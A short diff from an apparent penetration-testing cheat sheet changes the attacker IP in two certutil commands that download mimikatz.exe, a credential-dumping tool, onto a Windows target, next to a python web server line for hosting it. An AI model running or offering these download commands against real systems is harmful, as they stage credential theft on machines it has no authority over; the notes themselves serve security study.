@@ -148,8 +148,8 @@ python3 -m http.server 80
 __CMD__
 Use cmd to download files. 
 ``` 
-certutil -urlcache -split -f "http://10.11.0.158/mimikatz.exe" mim.exe
-certutil.exe -urlcache -split -f "http://10.11.0.158/mimikatz.exe" %TMP%\mim.exe
+certutil -urlcache -split -f "http://10.10.10.17/mimikatz.exe" mim.exe
+certutil.exe -urlcache -split -f "http://10.10.10.17/mimikatz.exe" %TMP%\mim.exe
 ``` 
 
 __Powershell__
